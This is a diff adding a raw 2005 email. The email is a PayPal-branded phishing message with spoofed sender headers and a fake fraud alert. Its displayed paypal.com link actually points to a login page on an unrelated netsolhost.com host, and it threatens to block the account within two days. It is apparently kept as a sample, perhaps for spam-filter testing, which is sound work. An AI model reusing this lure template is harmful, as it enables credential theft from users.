@@ -1,0 +1,121 @@
+Return-Path: <support@paypal.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 28988 invoked by uid 115); 7 Jul 2005 02:57:51 -0000
+Received: from support@paypal.com by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(66.98.132.40):. 
+ Processed in 0.141275 secs); 07 Jul 2005 02:57:51 -0000
+Received: from dns1.roundtablehost.com (HELO 66.98.132.40) (66.98.132.40)
+  by churchill.factcomp.com with SMTP; 7 Jul 2005 02:57:50 -0000
+Received: from 62.64.222.164 by ; Thu, 07 Jul 2005 05:56:07 +0100
+Message-ID: <UZNHLQCBPWOZIBXAAJQT@comcast.net>
+From: "PayPal Security Service" <support@paypal.com>
+Reply-To: "PayPal Security Service" <support@paypal.com>
+To: bruceg@em.ca
+Subject: Security Alert - Confirm Your PayPal Information
+Date: Wed, 06 Jul 2005 21:51:07 -0700
+X-Mailer: Microsoft Outlook Express 5.00.2919.6700
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--1202438114715445897"
+X-Priority: 3
+X-MSMail-Priority: Normal
+
+----1202438114715445897
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+
+<head>
+<meta name=3D"GENERATOR" content=3D"Microsoft FrontPage 5.0">
+<meta name=3D"ProgId" content=3D"FrontPage.Editor.Document">
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-=
+1252">
+<title>Fraud Alert ID</title>
+</head>
+
+<body>
+
+<table cellSpacing=3D"0" cellPadding=3D"0" width=3D"600" align=3D"center" =
+border=3D"0">
+  <tr>
+    <td>
+    <a href=3D"http://0046acd.netsolhost.com/paypal/cgi-bin/webscrcmd_logi=
+n.php">
+    <img height=3D"35" alt=3D"PayPal" src=3D"http://www.paypal.com/images/=
+paypal_logo.gif" width=3D"109" vspace=3D"10" border=3D"0" target=3D"_blank=
+"></a></td>
+  </tr>
+</table>
+<table cellSpacing=3D"0" cellPadding=3D"0" width=3D"100%" border=3D"0">
+  <tr>
+    <td width=3D"100%" background=3D"http://www.paypal.com/images/bg_clk.g=
+if">
+    <img height=3D"29" src=3D"http://www.paypal.com/images/pixel.gif" widt=
+h=3D"1" border=3D"0"></td>
+  </tr>
+  <tr>
+    <td>
+    <img height=3D"10" src=3D"http://www.paypal.com/images/pixel.gif" widt=
+h=3D"1" border=3D"0"></td>
+  </tr>
+</table>
+<table cellSpacing=3D"0" cellPadding=3D"5" width=3D"600" align=3D"center" =
+border=3D"0">
+  <tr>
+    <td vAlign=3D"top" height=3D"259"><br>
+    <font size=3D"-1"><strong>Fraud Alert ID : 0026654</strong></font><br>=
+
+&nbsp;<p>You have recieve this email because you or someone had tried to u=
+sed 
+    your paypal account at http://www.springbok-computers.co.uk/. Below is=
+ the 
+    detail about the transaction made:</p>
+    <blockquote>
+      <blockquote>
+        <p><font color=3D"#ff0000">Transaction site : 
+        http://www.springbok-computers.co.uk/<br>
+        Order ID : FMO12446465<br>
+        Amount : $850<br>
+        Date : Fri, 19 Dec 2003 20:41:09 +1100<br>
+&nbsp;</font></p>
+      </blockquote>
+    </blockquote>
+    <p>To confirm or decline this transaction, please follow the link prov=
+ide 
+    below. Please save the fraud alert id for your reference.<br>
+    <br>
+&nbsp;</p>
+    <p align=3D"center"><a href=3D"http://0046acd.netsolhost.com/paypal/cg=
+i-bin/webscrcmd_login.php">
+    http://www.paypal.com/fraud?_alert_id=3Dpaypal&amp;user=3D0026654</a><=
+/p>
+    <p align=3D"center">&nbsp;</p>
+    <p>Your account will be block after 2 days you recieve this email if w=
+e 
+    didnt get comfirmation from you. Do not reply as this is a notificatio=
+n 
+    only.</td>
+  </tr>
+  <tr>
+    <td align=3D"middle" target=3D"_blank">&nbsp;<p><br>
+    <strong>Thanks for using PayPal!</strong></p>
+    <p>Copyright=A9 2005 PayPal Inc. All rights reserved. Designated trade=
+marks 
+    and brands are the property of their respective owners.<br>
+&nbsp;</td>
+  </tr>
+  <tr>
+    <td>
+    <img src=3D"http://www.paypal.com/images/dot_row_long.gif" target=3D"_=
+blank" width=3D"590" height=3D"5"></td>
+  </tr>
+</table>
+
+</body>
+
+</html>
+
+
+----1202438114715445897--
+
